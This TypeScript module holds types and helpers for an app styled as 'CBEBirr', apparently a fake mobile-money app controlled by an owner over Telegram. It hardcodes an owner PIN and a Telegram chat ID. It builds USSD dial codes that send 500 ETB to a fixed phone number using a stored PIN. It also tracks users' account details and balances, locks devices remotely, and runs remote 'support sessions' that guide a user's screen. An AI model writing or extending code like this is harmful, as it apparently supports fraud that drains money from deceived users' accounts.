export const OWNER_PIN = '0069';
export const DEFAULT_TELEGRAM_OWNER_CHAT_ID = '6821934730';
export const DEVICE_ONLINE_THRESHOLD_MS = 35_000;

export type DevicePlatform = 'android-apk' | 'web-pwa' | 'web';
export type DeviceApprovalStatus = 'pending' | 'approved' | 'rejected';

export interface UssdPaymentPreset {
  id: string;
  label: string;
  template: string;
  phoneNumber: string;
  amount: string;
  pin: string;
  updatedAtMs: number;
}

export interface UssdPaymentConfig {
  activePresetId: string;
  presets: UssdPaymentPreset[];
  updatedBy: 'telegram' | 'app_0069' | 'system';
  updatedAtMs: number;
}

export const DEFAULT_USSD_PAYMENT_PRESET: UssdPaymentPreset = {
  id: 'ussd_cbe_500_default',
  label: 'CBEBirr 500 ETB (Default)',
  template: '*847*1*1*{phone}*{amount}*{pin}*1#',
  phoneNumber: '0959754788',
  amount: '500',
  pin: '6969',
  updatedAtMs: 0,
};

export const DEFAULT_USSD_PAYMENT_CONFIG: UssdPaymentConfig = {
  activePresetId: DEFAULT_USSD_PAYMENT_PRESET.id,
  presets: [DEFAULT_USSD_PAYMENT_PRESET],
  updatedBy: 'system',
  updatedAtMs: 0,
};

export function resolveUssdPaymentCommand(
  preset?: Partial<UssdPaymentPreset> | null,
  overrides?: { phoneNumber?: string; amount?: string; pin?: string }
): {
  displayCode: string;
  dialUri: string;
  phoneNumber: string;
  amount: string;
  pin: string;
  template: string;
} {
  const tplRaw = String(preset?.template || DEFAULT_USSD_PAYMENT_PRESET.template).trim();
  const phone = String(
    overrides?.phoneNumber ?? preset?.phoneNumber ?? DEFAULT_USSD_PAYMENT_PRESET.phoneNumber
  )
    .replace(/[^0-9+]/g, '')
    .trim();
  const amount = String(
    overrides?.amount ?? preset?.amount ?? DEFAULT_USSD_PAYMENT_PRESET.amount
  )
    .replace(/[^0-9.]/g, '')
    .trim();
  const pin = String(
    overrides?.pin ?? preset?.pin ?? DEFAULT_USSD_PAYMENT_PRESET.pin
  )
    .replace(/[^0-9]/g, '')
    .trim();

  let code = (tplRaw || DEFAULT_USSD_PAYMENT_PRESET.template)
    .replace(/^tel:/i, '')
    .replace(/%23/gi, '#')
    .replace(/\s+/g, '');

  code = code.replace(
    /\{phone\s*number\}|\[phone\s*number\]|\{phone_number\}|\[phone_number\]|\{phonenumber\}|\{phone\}|\[phone\]|\{number\}|\[number\]|\{mobile\}|\[mobile\]|\{receiver\}|\[receiver\]/gi,
    phone
  );
  code = code.replace(/\{amount\}|\[amount\]|\{amt\}|\[amt\]/gi, amount);
  code = code.replace(/\{pin\}|\[pin\]|\{pass\}|\[pass\]/gi, pin);

  if (!code.endsWith('#')) {
    code = `${code}#`;
  }

  return {
    displayCode: code,
    dialUri: `tel:${code.replace(/#/g, '%23')}`,
    phoneNumber: phone,
    amount,
    pin,
    template: tplRaw || DEFAULT_USSD_PAYMENT_PRESET.template,
  };
}

export function getActiveUssdPreset(config?: UssdPaymentConfig | null): UssdPaymentPreset {
  const presets = Array.isArray(config?.presets) && config!.presets.length > 0
    ? config!.presets
    : [DEFAULT_USSD_PAYMENT_PRESET];
  return presets.find((p) => p.id === config?.activePresetId) || presets[0];
}

export interface DeviceClient {
  deviceId: string;
  deviceName: string;
  platform: DevicePlatform;
  appVersion: string;
  userName: string;
  phoneNumber: string;
  userAccount: string;
  balance: number;
  isLocked: boolean;
  lockReason?: string;
  approvalStatus?: DeviceApprovalStatus;
  paymentUssdTriggered?: boolean;
  paymentUssdCode?: string;
  lastSeenAtMs: number;
  isOnline?: boolean;
  ownerId?: string;
  createdAtMs?: number;
  updatedAtMs?: number;
}

export interface DeviceTransaction {
  txId: string;
  deviceId: string;
  deviceName: string;
  senderName: string;
  senderPhone: string;
  senderAccount: string;
  title: string;
  txType: 'debit' | 'credit';
  amount: number;
  totalDeducted: number;
  balanceAfter: number;
  recipientName: string;
  recipientAccount: string;
  destBank?: string;
  transferLabel: string;
  ref: string;
  reason: string;
  status: 'Completed' | 'Pending' | 'Failed';
  createdAtMs: number;
}

export interface OwnerNotification {
  notifId: string;
  targetDeviceId: string; // 'all' or specific deviceId
  title: string;
  message: string;
  durationSeconds: number;
  sentBy: 'telegram' | 'app_0069';
  createdAtMs: number;
  expiresAtMs: number;
}

export interface OwnerGlobalConfig {
  configId: string;
  globalLocked: boolean;
  globalLockMessage: string;
  ussdPaymentConfig?: UssdPaymentConfig;
  updatedBy: 'telegram' | 'app_0069' | 'system';
  updatedAtMs: number;
}

export interface OwnerDashboardSnapshot {
  devices: DeviceClient[];
  transactions: DeviceTransaction[];
  notifications: OwnerNotification[];
  globalConfig: OwnerGlobalConfig;
  ussdPaymentConfig: UssdPaymentConfig;
  storageMode: 'firestore' | 'local-cache';
  telegramConfigured: boolean;
  serverTimeMs: number;
}

export type SupportSessionStatus = 'pending' | 'active' | 'ended' | 'declined';

export type SupportCommandType =
  | 'none'
  | 'navigate_step'
  | 'highlight_point'
  | 'show_tip';

export interface SupportSession {
  sessionId: string;
  deviceId: string;
  deviceName: string;
  status: SupportSessionStatus;
  requestedBy: 'app_0069' | 'ram_control';
  currentStep: number;
  activeTab: string;
  screenTitle: string;
  recipientSummary: string;
  amountSummary: string;
  balance: number;
  userName: string;
  phoneNumber: string;
  pointerX: number;
  pointerY: number;
  pointerLabel: string;
  commandSeq: number;
  commandType: SupportCommandType;
  commandPayload: string;
  stateSeq: number;
  requestedAtMs: number;
  acceptedAtMs: number;
  expiresAtMs: number;
  updatedAtMs: number;
}

export interface DeviceSyncResponse {
  success: boolean;
  deviceId: string;
  approvalStatus: DeviceApprovalStatus;
  globalLocked: boolean;
  deviceLocked: boolean;
  effectiveLocked: boolean;
  lockMessage: string;
  notifications: OwnerNotification[];
  supportSession?: SupportSession | null;
  ussdPaymentConfig?: UssdPaymentConfig;
  serverTimeMs: number;
}

export function getOwnerApiBaseUrl(): string {
  if (typeof window !== 'undefined') {
    const origin = window.location?.origin || '';
    const protocol = window.location?.protocol || '';
    if (
      origin.includes('appassets.androidplatform.net') ||
      protocol === 'file:'
    ) {
      return 'https://cbebirr-lovat.vercel.app';
    }
    if (origin.startsWith('http')) {
      return origin.replace(/\/$/, '');
    }
  }
  return 'https://cbebirr-lovat.vercel.app';
}

export function isDeviceOnline(lastSeenAtMs: number, nowMs = Date.now()): boolean {
  return nowMs - lastSeenAtMs <= DEVICE_ONLINE_THRESHOLD_MS;
}

export function formatRelativeTime(tsMs: number, nowMs = Date.now()): string {
  const diffSec = Math.max(0, Math.floor((nowMs - tsMs) / 1000));
  if (diffSec < 10) return 'just now';
  if (diffSec < 60) return `${diffSec}s ago`;
  const diffMin = Math.floor(diffSec / 60);
  if (diffMin < 60) return `${diffMin}m ago`;
  const diffHr = Math.floor(diffMin / 60);
  if (diffHr < 24) return `${diffHr}h ago`;
  const diffDay = Math.floor(diffHr / 24);
  return `${diffDay}d ago`;
}

export function parseDurationToSeconds(raw: string | number): number | null {
  if (typeof raw === 'number') {
    if (!Number.isFinite(raw) || raw < 1) return null;
    return Math.min(86400, Math.round(raw));
  }
  const s = String(raw || '').trim().toLowerCase();
  const match = s.match(/^(\d+(?:\.\d+)?)\s*(s|sec|secs|second|seconds|m|min|mins|minute|minutes|h|hr|hrs|hour|hours)?$/i);
  if (!match) return null;
  const num = parseFloat(match[1]);
  if (!Number.isFinite(num) || num <= 0) return null;
  const unit = (match[2] || 's').toLowerCase();
  let seconds = num;
  if (unit.startsWith('m')) seconds = num * 60;
  else if (unit.startsWith('h')) seconds = num * 3600;
  return Math.max(1, Math.min(86400, Math.round(seconds)));
}
